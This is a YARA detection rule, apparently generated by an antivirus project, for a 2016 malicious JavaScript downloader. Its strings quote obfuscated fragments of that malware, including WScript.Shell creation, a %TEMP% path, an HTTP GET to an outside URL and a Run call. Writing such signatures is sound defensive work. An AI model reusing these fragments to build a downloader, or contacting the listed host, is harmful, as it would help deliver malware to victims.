rule sig_20160427_afdcba5fff10e6bee1dcadd6188ad7fe {
  meta:
    description = "datamaliciousorder - file 20160427_afdcba5fff10e6bee1dcadd6188ad7fe.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "0d8d9b83e595cfcbc84f392f4c7270e6acf2fc1c14b23e1ac69b23d072b62938"

  strings:
    $s1  = "function YezelGxshq() {return GpboxJqiuy[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"4gq4jhb" ascii
    $s2  = "function YezelGxshq() {return GpboxJqiuy[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"4gq4jhb" ascii
    $s3  = "function LcdqeJjhwd(EcpuxBxhsh, BgdicLokbs){UwiikVnosl = UwiikVnosl * 1; return EcpuxBxhsh - BgdicLokbs;};" fullword ascii
    $s4  = "var GpboxJqiuy = function TrpivOnbtg() {return WimfqNjyag[OfvvhUsumh](\"WScript\"+\".Shell\");}(), OoaitEhiwh = 11;" fullword ascii
    $s5  = "AozhjDwvqy[CicypWkllx](\"G\" + \"ET\", \"http://lbbc.pt/n8wisd\", false);" fullword ascii
    $s6  = "var WimfqNjyag = this[\"WScript\"];" fullword ascii
    $s7  = "function SezovRsvly(){return RzrstCyvqn + \"\";};" fullword ascii
    $s8  = "if (AozhjDwvqy[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s9  = "function XdlgiXzjfs() {return ((ArgxyMgrbu == true) && (ArgxyMgrbu == JgvkuAfnbn)) ? 1 : UwiikVnosl;};" fullword ascii
    $s10 = "function EuffhEfklj()" fullword ascii
    $s11 = "var JgvkuAfnbn = false;" fullword ascii
    $s12 = "var LekmwRlqub = new this[\"D\"+\"ate\"]();" fullword ascii
    $s13 = "function DgpbpHcumr(SqesdMkkfl) {var TlzfpNbnkm = (1, 2, 3, 4, 5, SqesdMkkfl); return TlzfpNbnkm;};" fullword ascii
    $s14 = "function LnuwtQechw(ZdsnfElraa){GpboxJqiuy[\"R\"+\"un\"](ZdsnfElraa, UwiikVnosl, UwiikVnosl);};" fullword ascii
    $s15 = "function GrxisOvlbd(){return OfvvhUsumh;};" fullword ascii
    $s16 = "function LpphoWljrl(){return 23;};" fullword ascii
    $s17 = "}while (YyhqrPwyfn);" fullword ascii
    $s18 = "return LcdqeJjhwd(MstveYdsjg, SicetZzfol);" fullword ascii
    $s19 = "EvsnaBvvux = true;" fullword ascii
    $s20 = "var ArgxyMgrbu = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}